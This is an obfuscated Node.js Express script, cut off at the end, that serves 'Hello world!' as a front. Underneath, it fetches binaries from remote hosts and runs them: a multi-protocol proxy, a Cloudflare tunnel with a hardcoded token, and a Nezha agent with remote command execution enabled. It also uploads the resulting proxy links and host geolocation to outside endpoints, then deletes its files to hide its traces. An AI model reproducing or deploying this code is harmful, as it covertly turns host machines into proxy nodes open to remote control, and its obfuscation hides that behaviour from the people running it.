const _0xd6d8a8=_0x5c42;(function(_0x53e7f2,_0x5f3857){const _0x5536fe=_0x5c42,_0x1d1b66=_0x53e7f2();while(!![]){try{const _0x4c02e8=-parseInt(_0x5536fe(0xde))/0x1*(parseInt(_0x5536fe(0xce))/0x2)+-parseInt(_0x5536fe(0x17e))/0x3+parseInt(_0x5536fe(0xe6))/0x4+-parseInt(_0x5536fe(0x140))/0x5*(parseInt(_0x5536fe(0x173))/0x6)+-parseInt(_0x5536fe(0x154))/0x7+parseInt(_0x5536fe(0xfd))/0x8*(-parseInt(_0x5536fe(0xcb))/0x9)+-parseInt(_0x5536fe(0xe7))/0xa*(-parseInt(_0x5536fe(0x153))/0xb);if(_0x4c02e8===_0x5f3857)break;else _0x1d1b66['push'](_0x1d1b66['shift']());}catch(_0x11f026){_0x1d1b66['push'](_0x1d1b66['shift']());}}}(_0x390a,0xecf46));function _0x5c42(_0x4bcb12,_0x44808a){_0x4bcb12=_0x4bcb12-0xc8;const _0x390a50=_0x390a();let _0x5c42f6=_0x390a50[_0x4bcb12];return _0x5c42f6;}const express=require(_0xd6d8a8(0x162)),app=express(),axios=require(_0xd6d8a8(0xf4)),os=require('os'),fs=require('fs'),path=require(_0xd6d8a8(0x159)),{promisify}=require(_0xd6d8a8(0x131)),exec=promisify(require(_0xd6d8a8(0x124))['exec']),{execSync}=require(_0xd6d8a8(0x124)),UPLOAD_URL=process['env'][_0xd6d8a8(0xdd)]||'',PROJECT_URL=process[_0xd6d8a8(0x180)][_0xd6d8a8(0x11d)]||'',AUTO_ACCESS=process[_0xd6d8a8(0x180)]['AUTO_ACCESS']||![],FILE_PATH=process['env']['FILE_PATH']||'./tmp',SUB_PATH=process[_0xd6d8a8(0x180)][_0xd6d8a8(0xfe)]||_0xd6d8a8(0x103),PORT=process['env'][_0xd6d8a8(0x111)]||process[_0xd6d8a8(0x180)]['PORT']||0xbb8,UUID=process[_0xd6d8a8(0x180)][_0xd6d8a8(0x12d)]||'08c0688e-692d-4626-88e4-5eeb6ae7d250',NEZHA_SERVER=process[_0xd6d8a8(0x180)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0xd6d8a8(0x180)][_0xd6d8a8(0x16e)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0xd6d8a8(0xf9),ARGO_AUTH=process[_0xd6d8a8(0x180)][_0xd6d8a8(0x106)]||_0xd6d8a8(0xc9),ARGO_PORT=process['env'][_0xd6d8a8(0xfc)]||0x1f41,CFIP=process[_0xd6d8a8(0x180)][_0xd6d8a8(0x102)]||_0xd6d8a8(0x12c),CFPORT=process[_0xd6d8a8(0x180)][_0xd6d8a8(0xe3)]||0x1bb,NAME=process[_0xd6d8a8(0x180)][_0xd6d8a8(0x160)]||'house';!fs[_0xd6d8a8(0xd9)](FILE_PATH)?(fs[_0xd6d8a8(0x151)](FILE_PATH),console[_0xd6d8a8(0x17f)](FILE_PATH+'\x20is\x20created')):console[_0xd6d8a8(0x17f)](FILE_PATH+_0xd6d8a8(0xd6));function generateRandomName(){const _0x6e0ed5=_0xd6d8a8,_0x3a82bd=_0x6e0ed5(0x112);let _0x365d47='';for(let _0x4ae9a0=0x0;_0x4ae9a0<0x6;_0x4ae9a0++){_0x365d47+=_0x3a82bd[_0x6e0ed5(0x11c)](Math[_0x6e0ed5(0x12b)](Math[_0x6e0ed5(0x13e)]()*_0x3a82bd[_0x6e0ed5(0x186)]));}return _0x365d47;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xd6d8a8(0x17c)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0xd6d8a8(0x17c)](FILE_PATH,webName),botPath=path[_0xd6d8a8(0x17c)](FILE_PATH,botName),subPath=path[_0xd6d8a8(0x17c)](FILE_PATH,_0xd6d8a8(0xea)),listPath=path['join'](FILE_PATH,_0xd6d8a8(0x11b)),bootLogPath=path[_0xd6d8a8(0x17c)](FILE_PATH,_0xd6d8a8(0xd3)),configPath=path[_0xd6d8a8(0x17c)](FILE_PATH,_0xd6d8a8(0x13d));function deleteNodes(){const _0x42ae03=_0xd6d8a8;try{if(!UPLOAD_URL)return;if(!fs[_0x42ae03(0xd9)](subPath))return;let _0x1e08df;try{_0x1e08df=fs[_0x42ae03(0x18b)](subPath,_0x42ae03(0xf0));}catch{return null;}const _0x3fbc12=Buffer[_0x42ae03(0x10d)](_0x1e08df,_0x42ae03(0xf5))[_0x42ae03(0x11f)](_0x42ae03(0xf0)),_0x44cb36=_0x3fbc12[_0x42ae03(0x113)]('\x0a')['filter'](_0xf3cb87=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x42ae03(0xfb)](_0xf3cb87));if(_0x44cb36[_0x42ae03(0x186)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0x42ae03(0x169)]({'nodes':_0x44cb36}),{'headers':{'Content-Type':_0x42ae03(0x168)}})[_0x42ae03(0xd2)](_0x11b11a=>{return null;}),null;}catch(_0x31e572){return null;}}function cleanupOldFiles(){try{const _0x49e0cb=fs['readdirSync'](FILE_PATH);_0x49e0cb['forEach'](_0x118787=>{const _0x2a3802=_0x5c42,_0x17310f=path[_0x2a3802(0x17c)](FILE_PATH,_0x118787);try{const _0x37be4f=fs['statSync'](_0x17310f);_0x37be4f[_0x2a3802(0x133)]()&&fs[_0x2a3802(0x15d)](_0x17310f);}catch(_0x55ad42){}});}catch(_0x4ea4dd){}}app[_0xd6d8a8(0x132)]('/',function(_0x3aace2,_0x378d8b){const _0x7749c1=_0xd6d8a8;_0x378d8b[_0x7749c1(0x130)]('Hello\x20world!');});async function generateConfig(){const _0x4889a7=_0xd6d8a8,_0x2d4e20={'log':{'access':_0x4889a7(0xe4),'error':_0x4889a7(0xe4),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4889a7(0xeb),'settings':{'clients':[{'id':UUID,'flow':_0x4889a7(0xd5)}],'decryption':_0x4889a7(0x10e),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x4889a7(0x17b),'dest':0xbbc}]},'streamSettings':{'network':_0x4889a7(0xec)}},{'port':0xbb9,'listen':_0x4889a7(0x163),'protocol':_0x4889a7(0xeb),'settings':{'clients':[{'id':UUID}],'decryption':_0x4889a7(0x10e)},'streamSettings':{'network':_0x4889a7(0xec),'security':_0x4889a7(0x10e)}},{'port':0xbba,'listen':_0x4889a7(0x163),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x4889a7(0x15b)}},'sniffing':{'enabled':!![],'destOverride':[_0x4889a7(0x148),'tls',_0x4889a7(0xe1)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4889a7(0x13c)}},'sniffing':{'enabled':!![],'destOverride':[_0x4889a7(0x148),_0x4889a7(0x125),_0x4889a7(0xe1)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4889a7(0x163),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4889a7(0x10e),'wsSettings':{'path':_0x4889a7(0x17b)}},'sniffing':{'enabled':!![],'destOverride':[_0x4889a7(0x148),'tls',_0x4889a7(0xe1)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x4889a7(0xcd),'tag':_0x4889a7(0x185)},{'protocol':_0x4889a7(0xe5),'tag':_0x4889a7(0xef)}]};fs[_0x4889a7(0xf3)](path['join'](FILE_PATH,_0x4889a7(0x13d)),JSON['stringify'](_0x2d4e20,null,0x2));}function getSystemArchitecture(){const _0x33156d=_0xd6d8a8,_0x278215=os[_0x33156d(0x161)]();return _0x278215==='arm'||_0x278215==='arm64'||_0x278215==='aarch64'?_0x33156d(0x14a):_0x33156d(0xf8);}function downloadFile(_0x2be3a8,_0x194ad4,_0x3eb85d){const _0x759633=_0xd6d8a8,_0x48dfc0=_0x2be3a8;!fs['existsSync'](FILE_PATH)&&fs[_0x759633(0x151)](FILE_PATH,{'recursive':!![]});const _0x161d8e=fs[_0x759633(0x128)](_0x48dfc0);axios({'method':_0x759633(0x132),'url':_0x194ad4,'responseType':_0x759633(0x187)})['then'](_0x2baf57=>{const _0x20cbf1=_0x759633;_0x2baf57[_0x20cbf1(0x137)][_0x20cbf1(0x107)](_0x161d8e),_0x161d8e['on'](_0x20cbf1(0x12f),()=>{const _0x428722=_0x20cbf1;_0x161d8e[_0x428722(0xe0)](),console[_0x428722(0x17f)]('Download\x20'+path[_0x428722(0x17d)](_0x48dfc0)+'\x20successfully'),_0x3eb85d(null,_0x48dfc0);}),_0x161d8e['on']('error',_0x12e5ff=>{const _0x3af7ea=_0x20cbf1;fs[_0x3af7ea(0x136)](_0x48dfc0,()=>{});const _0x141cae='Download\x20'+path[_0x3af7ea(0x17d)](_0x48dfc0)+_0x3af7ea(0x118)+_0x12e5ff[_0x3af7ea(0x145)];console[_0x3af7ea(0x14c)](_0x141cae),_0x3eb85d(_0x141cae);});})[_0x759633(0xd2)](_0x714f56=>{const _0x5e3b7e=_0x759633,_0x25a45e='Download\x20'+path['basename'](_0x48dfc0)+_0x5e3b7e(0x118)+_0x714f56[_0x5e3b7e(0x145)];console['error'](_0x25a45e),_0x3eb85d(_0x25a45e);});}async function downloadFilesAndRun(){const _0x55be2f=_0xd6d8a8,_0x27022a=getSystemArchitecture(),_0x4eb9b1=getFilesForArchitecture(_0x27022a);if(_0x4eb9b1[_0x55be2f(0x186)]===0x0){console[_0x55be2f(0x17f)](_0x55be2f(0x109));return;}const _0x17f246=_0x4eb9b1[_0x55be2f(0x16f)](_0x1b04b5=>{return new Promise((_0x40f742,_0x4b5f49)=>{const _0x1f1096=_0x5c42;downloadFile(_0x1b04b5['fileName'],_0x1b04b5[_0x1f1096(0x126)],(_0x33f65d,_0xdae1ec)=>{_0x33f65d?_0x4b5f49(_0x33f65d):_0x40f742(_0xdae1ec);});});});try{await Promise[_0x55be2f(0x174)](_0x17f246);}catch(_0x9ac28f){console[_0x55be2f(0x14c)](_0x55be2f(0x134),_0x9ac28f);return;}function _0x28a62d(_0x664d1f){const _0x5284e0=_0x55be2f,_0x208cbd=0x1fd;_0x664d1f[_0x5284e0(0xdc)](_0x41d1a2=>{const _0x3e7496=_0x5284e0;fs[_0x3e7496(0xd9)](_0x41d1a2)&&fs[_0x3e7496(0x127)](_0x41d1a2,_0x208cbd,_0x19cc29=>{const _0x813758=_0x3e7496;_0x19cc29?console[_0x813758(0x14c)](_0x813758(0x15a)+_0x41d1a2+':\x20'+_0x19cc29):console[_0x813758(0x17f)](_0x813758(0x119)+_0x41d1a2+':\x20'+_0x208cbd[_0x813758(0x11f)](0x8));});});}const _0x502a56=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x28a62d(_0x502a56);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x38d9b8=NEZHA_SERVER[_0x55be2f(0x152)](':')?NEZHA_SERVER[_0x55be2f(0x113)](':')[_0x55be2f(0xd8)]():'',_0xb45ab=new Set([_0x55be2f(0x170),_0x55be2f(0x164),'2096',_0x55be2f(0x122),_0x55be2f(0x138),'2053']),_0x440cb7=_0xb45ab[_0x55be2f(0x165)](_0x38d9b8)?'true':_0x55be2f(0x155),_0x528e12=_0x55be2f(0xe8)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x55be2f(0x114)+_0x440cb7+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x55be2f(0xf3)](path['join'](FILE_PATH,_0x55be2f(0x14b)),_0x528e12);const _0x4ed11e=_0x55be2f(0x17a)+phpPath+_0x55be2f(0x144)+FILE_PATH+_0x55be2f(0xf2);try{await exec(_0x4ed11e),console[_0x55be2f(0x17f)](phpName+_0x55be2f(0x158)),await new Promise(_0x25fbf0=>setTimeout(_0x25fbf0,0x3e8));}catch(_0x446057){console[_0x55be2f(0x14c)](_0x55be2f(0x13f)+_0x446057);}}else{let _0x16f44f='';const _0x26d6fd=[_0x55be2f(0x170),_0x55be2f(0x164),'2096',_0x55be2f(0x122),_0x55be2f(0x138),_0x55be2f(0xcc)];_0x26d6fd[_0x55be2f(0x152)](NEZHA_PORT)&&(_0x16f44f=_0x55be2f(0xcf));const _0x1f6333=_0x55be2f(0x17a)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x55be2f(0x181)+NEZHA_KEY+'\x20'+_0x16f44f+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1f6333),console[_0x55be2f(0x17f)](npmName+_0x55be2f(0x158)),await new Promise(_0x27bc89=>setTimeout(_0x27bc89,0x3e8));}catch(_0x5f1dd1){console[_0x55be2f(0x14c)](_0x55be2f(0x184)+_0x5f1dd1);}}}else console[_0x55be2f(0x17f)](_0x55be2f(0x101));const _0x57a646=_0x55be2f(0x17a)+webPath+_0x55be2f(0x175)+FILE_PATH+_0x55be2f(0x172);try{await exec(_0x57a646),console[_0x55be2f(0x17f)](webName+_0x55be2f(0x158)),await new Promise(_0x2cbae4=>setTimeout(_0x2cbae4,0x3e8));}catch(_0x2661de){console[_0x55be2f(0x14c)](_0x55be2f(0x178)+_0x2661de);}if(fs[_0x55be2f(0xd9)](botPath)){let _0x26bf4a;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x26bf4a='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x55be2f(0xf1)](/TunnelSecret/)?_0x26bf4a=_0x55be2f(0x13a)+FILE_PATH+_0x55be2f(0x157):_0x26bf4a='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x55be2f(0x17a)+botPath+'\x20'+_0x26bf4a+_0x55be2f(0x10a)),console[_0x55be2f(0x17f)](botName+_0x55be2f(0x158)),await new Promise(_0x610cbd=>setTimeout(_0x610cbd,0x7d0));}catch(_0xac4cb3){console[_0x55be2f(0x14c)](_0x55be2f(0x10b)+_0xac4cb3);}}await new Promise(_0x1baf82=>setTimeout(_0x1baf82,0x1388));}function getFilesForArchitecture(_0x4bdc8c){const _0x5b2dcc=_0xd6d8a8;let _0x17501f;_0x4bdc8c===_0x5b2dcc(0x14a)?_0x17501f=[{'fileName':webPath,'fileUrl':_0x5b2dcc(0xd7)},{'fileName':botPath,'fileUrl':_0x5b2dcc(0xd4)}]:_0x17501f=[{'fileName':webPath,'fileUrl':_0x5b2dcc(0x149)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x48a84e=_0x4bdc8c==='arm'?_0x5b2dcc(0x183):_0x5b2dcc(0xd1);_0x17501f['unshift']({'fileName':npmPath,'fileUrl':_0x48a84e});}else{const _0x451cf3=_0x4bdc8c===_0x5b2dcc(0x14a)?_0x5b2dcc(0x13b):_0x5b2dcc(0xe9);_0x17501f[_0x5b2dcc(0x121)]({'fileName':phpPath,'fileUrl':_0x451cf3});}}return _0x17501f;}function argoType(){const _0x2cb098=_0xd6d8a8;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x2cb098(0x152)](_0x2cb098(0x14e))){fs[_0x2cb098(0xf3)](path['join'](FILE_PATH,_0x2cb098(0x10c)),ARGO_AUTH);const _0x3ab83e=_0x2cb098(0x141)+ARGO_AUTH['split']('\x22')[0xb]+_0x2cb098(0x115)+path[_0x2cb098(0x17c)](FILE_PATH,'tunnel.json')+_0x2cb098(0x12e)+ARGO_DOMAIN+_0x2cb098(0x188)+ARGO_PORT+_0x2cb098(0xfa);fs['writeFileSync'](path[_0x2cb098(0x17c)](FILE_PATH,_0x2cb098(0x166)),_0x3ab83e);}else console[_0x2cb098(0x17f)](_0x2cb098(0x12a));}async function extractDomains(){const _0x1c18f0=_0xd6d8a8;let _0x55ab60;if(ARGO_AUTH&&ARGO_DOMAIN)_0x55ab60=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x55ab60),await _0x51613b(_0x55ab60);else try{const _0x4b792e=fs[_0x1c18f0(0x18b)](path['join'](FILE_PATH,_0x1c18f0(0xd3)),_0x1c18f0(0xf0)),_0x3878fa=_0x4b792e['split']('\x0a'),_0x20856c=[];_0x3878fa['forEach'](_0x6e58e6=>{const _0x1460ce=_0x1c18f0,_0x8f9eeb=_0x6e58e6['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x8f9eeb){const _0x354c6e=_0x8f9eeb[0x1];_0x20856c[_0x1460ce(0x177)](_0x354c6e);}});if(_0x20856c[_0x1c18f0(0x186)]>0x0)_0x55ab60=_0x20856c[0x0],console[_0x1c18f0(0x17f)](_0x1c18f0(0x147),_0x55ab60),await _0x51613b(_0x55ab60);else{console[_0x1c18f0(0x17f)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x1c18f0(0x15d)](path[_0x1c18f0(0x17c)](FILE_PATH,_0x1c18f0(0xd3)));async function _0x371fab(){const _0x56e215=_0x1c18f0;try{process[_0x56e215(0x179)]===_0x56e215(0x110)?await exec(_0x56e215(0x15f)+botName+_0x56e215(0x142)):await exec(_0x56e215(0x117)+botName[_0x56e215(0x11c)](0x0)+']'+botName[_0x56e215(0xc8)](0x1)+_0x56e215(0x11e));}catch(_0x5a9015){}}_0x371fab(),await new Promise(_0x47d480=>setTimeout(_0x47d480,0xbb8));const _0x263931=_0x1c18f0(0x123)+FILE_PATH+_0x1c18f0(0xed)+ARGO_PORT;try{await exec(_0x1c18f0(0x17a)+botPath+'\x20'+_0x263931+'\x20>/dev/null\x202>&1\x20&'),console[_0x1c18f0(0x17f)](botName+_0x1c18f0(0x158)),await new Promise(_0x17d9eb=>setTimeout(_0x17d9eb,0xbb8)),await extractDomains();}catch(_0x1920df){console['error'](_0x1c18f0(0x10b)+_0x1920df);}}}catch(_0x40001d){console[_0x1c18f0(0x14c)](_0x1c18f0(0xff),_0x40001d);}async function _0x1eb138(){const _0x20e8bc=_0x1c18f0;try{const _0xd72e52=await axios['get'](_0x20e8bc(0x105),{'timeout':0xbb8});if(_0xd72e52[_0x20e8bc(0x137)]&&_0xd72e52[_0x20e8bc(0x137)]['country_code']&&_0xd72e52[_0x20e8bc(0x137)][_0x20e8bc(0x156)])return _0xd72e52[_0x20e8bc(0x137)][_0x20e8bc(0x11a)]+'_'+_0xd72e52[_0x20e8bc(0x137)]['org'];}catch(_0x38b857){try{const _0x13c7eb=await axios[_0x20e8bc(0x132)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x13c7eb[_0x20e8bc(0x137)]&&_0x13c7eb[_0x20e8bc(0x137)][_0x20e8bc(0x176)]===_0x20e8bc(0xf6)&&_0x13c7eb['data'][_0x20e8bc(0x16b)]&&_0x13c7eb[_0x20e8bc(0x137)][_0x20e8bc(0x156)])return _0x13c7eb[_0x20e8bc(0x137)][_0x20e8bc(0x16b)]+'_'+_0x13c7eb[_0x20e8bc(0x137)][_0x20e8bc(0x156)];}catch(_0x50f4e3){}}return _0x20e8bc(0x14f);}async function _0x51613b(_0x1fce3b){const _0x48c801=await _0x1eb138(),_0x236dce=NAME?NAME+'-'+_0x48c801:_0x48c801;return new Promise(_0x438050=>{setTimeout(()=>{const _0xadc9a0=_0x5c42,_0x5f2818={'v':'2','ps':''+_0x236dce,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xadc9a0(0x10e),'net':'ws','type':_0xadc9a0(0x10e),'host':_0x1fce3b,'path':_0xadc9a0(0x15e),'tls':_0xadc9a0(0x125),'sni':_0x1fce3b,'alpn':'','fp':_0xadc9a0(0xdb)},_0x350074=_0xadc9a0(0x15c)+UUID+'@'+CFIP+':'+CFPORT+_0xadc9a0(0x16a)+_0x1fce3b+_0xadc9a0(0x10f)+_0x1fce3b+_0xadc9a0(0x16d)+_0x236dce+'\x0a\x0avmess://'+Buffer[_0xadc9a0(0x10d)](JSON['stringify'](_0x5f2818))[_0xadc9a0(0x11f)]('base64')+_0xadc9a0(0x171)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x1fce3b+_0xadc9a0(0x10f)+_0x1fce3b+_0xadc9a0(0x146)+_0x236dce+_0xadc9a0(0x14d);console['log'](Buffer[_0xadc9a0(0x10d)](_0x350074)[_0xadc9a0(0x11f)](_0xadc9a0(0xf5))),fs[_0xadc9a0(0xf3)](subPath,Buffer[_0xadc9a0(0x10d)](_0x350074)[_0xadc9a0(0x11f)]('base64')),console[_0xadc9a0(0x17f)](FILE_PATH+_0xadc9a0(0x18a)),uploadNodes(),app[_0xadc9a0(0x132)]('/'+SUB_PATH,(_0x28f268,_0x5e24be)=>{const _0x2f0261=_0xadc9a0,_0x199f9a=Buffer['from'](_0x350074)[_0x2f0261(0x11f)]('base64');_0x5e24be[_0x2f0261(0xd0)](_0x2f0261(0xee),_0x2f0261(0x189)),_0x5e24be[_0x2f0261(0x130)](_0x199f9a);}),_0x438050(_0x350074);},0x7d0);});}}async function uploadNodes(){const _0x403ad5=_0xd6d8a8;if(UPLOAD_URL&&PROJECT_URL){const _0x472368=PROJECT_URL+'/'+SUB_PATH,_0x1687bd={'subscription':[_0x472368]};try{const _0x53dd2a=await axios[_0x403ad5(0xda)](UPLOAD_URL+_0x403ad5(0x143),_0x1687bd,{'headers':{'Content-Type':_0x403ad5(0x168)}});return _0x53dd2a&&_0x53dd2a['status']===0xc8?(console['log'](_0x403ad5(0x104)),_0x53dd2a):null;}catch(_0x2e4342){if(_0x2e4342[_0x403ad5(0x139)]){if(_0x2e4342[_0x403ad5(0x139)][_0x403ad5(0x176)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x403ad5(0xd9)](listPath))return;const _0xc85654=fs[_0x403ad5(0x18b)](listPath,_0x403ad5(0xf0)),_0x26e225=_0xc85654[_0x403ad5(0x113)]('\x0a')[_0x403ad5(0x108)](_0x9dc15d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x403ad5(0xfb)](_0x9dc15d));if(_0x26e225[_0x403ad5(0x186)]===0x0)return;const _0x5824d0=JSON[_0x403ad5(0x169)]({'nodes':_0x26e225});try{const _0x5d823b=await axios[_0x403ad5(0xda)](UPLOAD_URL+'/api/add-nodes',_0x5824d0,{'headers':{'Content-Type':_0x403ad5(0x168)}});return _0x5d823b&&_0x5d823b[_0x403ad5(0x176)]===0xc8?(console[_0x403ad5(0x17f)](_0x403ad5(0x135)),_0x5d823b):null;}catch(_0x301b91){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x27235c=_0x5c42,_0x395724=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x395724[_0x27235c(0x177)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x395724[_0x27235c(0x177)](phpPath);process[_0x27235c(0x179)]===_0x27235c(0x110)?exec(_0x27235c(0x167)+_0x395724[_0x27235c(0x17c)]('\x20')+'\x20>\x20nul\x202>&1',_0x28a65f=>{const _0x180a96=_0x27235c;console[_0x180a96(0x100)](),console[_0x180a96(0x17f)](_0x180a96(0x129)),console['log'](_0x180a96(0xca));}):exec('rm\x20-rf\x20'+_0x395724['join']('\x20')+_0x27235c(0x182),_0x35b7f7=>{const _0x4bf2ae=_0x27235c;console[_0x4bf2ae(0x100)](),console[_0x4bf2ae(0x17f)](_0x4bf2ae(0x129)),console[_0x4bf2ae(0x17f)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}function _0x390a(){const _0x1c4b63=['2087','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','child_process','tls','fileUrl','chmod','createWriteStream','App\x20is\x20running','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','floor','cdns.doon.eu.org','UUID','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','finish','send','util','get','isFile','Error\x20downloading\x20files:','Nodes\x20uploaded\x20successfully','unlink','data','2083','response','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','https://arm64.ssss.nyc.mn/v1','/vmess-argo','config.json','random','php\x20running\x20error:\x20','25aMRUxb','\x0a\x20\x20tunnel:\x20','.exe\x20>\x20nul\x202>&1','/api/add-subscriptions','\x20-c\x20\x22','message','&path=%2Ftrojan-argo%3Fed%3D2560#','ArgoDomain:','http','https://amd64.ssss.nyc.mn/web','arm','config.yaml','error','\x0a\x20\x20\x20\x20','TunnelSecret','Unknown','automatic\x20access\x20task\x20added\x20successfully','mkdirSync','includes','161062vduFYW','8995091YVFAMU','false','org','/tunnel.yml\x20run','\x20is\x20running','path','Empowerment\x20failed\x20for\x20','/vless-argo','\x0avless://','unlinkSync','/vmess-argo?ed=2560','taskkill\x20/f\x20/im\x20','NAME','arch','express','127.0.0.1','8443','has','tunnel.yml','del\x20/f\x20/q\x20','application/json','stringify','?encryption=none&security=tls&sni=','countryCode','Skipping\x20adding\x20automatic\x20access\x20task','&path=%2Fvless-argo%3Fed%3D2560#','NEZHA_PORT','map','443','\x0a\x0atrojan://','/config.json\x20>/dev/null\x202>&1\x20&','573798KBIRLA','all','\x20-c\x20','status','push','web\x20running\x20error:\x20','platform','nohup\x20','/trojan-argo','join','basename','3696012zvKSCS','log','env','\x20-p\x20','\x20>/dev/null\x202>&1','https://arm64.ssss.nyc.mn/agent','npm\x20running\x20error:\x20','direct','length','stream','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','text/plain;\x20charset=utf-8','/sub.txt\x20saved\x20successfully','readFileSync','substring','eyJhIjoiZmQyNmM3ODkxNTI1OGYxMGQ0ZTMyNzJkNjFhY2M1NjQiLCJ0IjoiNTQ4NmZkMDMtNWUzOC00ZjRkLWE2MTgtZTk2ZTg5NjhmZjkyIiwicyI6IlpHTTFNamhoTnpRdE5qZ3pNUzAwWW1NekxUbG1abVF0Tm1NNE5EY3pNemczTmpZeCJ9','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','18HqXCdx','2053','freedom','432658AHdWMX','--tls','set','https://amd64.ssss.nyc.mn/agent','catch','boot.log','https://arm64.ssss.nyc.mn/bot','xtls-rprx-vision','\x20already\x20exists','https://arm64.ssss.nyc.mn/web','pop','existsSync','post','firefox','forEach','UPLOAD_URL','2MCHwEr','Error\x20in\x20startserver:','close','quic','Unhandled\x20error\x20in\x20startserver:','CFPORT','/dev/null','blackhole','4924392ANRCxB','2470IujcSd','\x0aclient_secret:\x20','https://amd64.ssss.nyc.mn/v1','sub.txt','vless','tcp','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Content-Type','block','utf-8','match','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','writeFileSync','axios','base64','success','listen','amd','jerry168.newman.de5.net','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','test','ARGO_PORT','1797064pulAAc','SUB_PATH','Error\x20reading\x20boot.log:','clear','NEZHA\x20variable\x20is\x20empty,skip\x20running','CFIP','sub','Subscription\x20uploaded\x20successfully','https://ipapi.co/json/','ARGO_AUTH','pipe','filter','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20>/dev/null\x202>&1\x20&','Error\x20executing\x20command:\x20','tunnel.json','from','none','&fp=firefox&type=ws&host=','win32','SERVER_PORT','abcdefghijklmnopqrstuvwxyz','split','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0a\x20\x20credentials-file:\x20','https://oooo.serv00.net/add-url','pkill\x20-f\x20\x22[','\x20failed:\x20','Empowerment\x20success\x20for\x20','country_code','list.txt','charAt','PROJECT_URL','\x22\x20>\x20/dev/null\x202>&1','toString','http\x20server\x20is\x20running\x20on\x20port:','unshift'];_0x390a=function(){return _0x1c4b63;};return _0x390a();}cleanFiles();async function AddVisitTask(){const _0x1357de=_0xd6d8a8;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1357de(0x17f)](_0x1357de(0x16c));return;}try{const _0x4eff53=await axios['post'](_0x1357de(0x116),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1357de(0x168)}});return console['log'](_0x1357de(0x150)),_0x4eff53;}catch(_0x5b717d){return 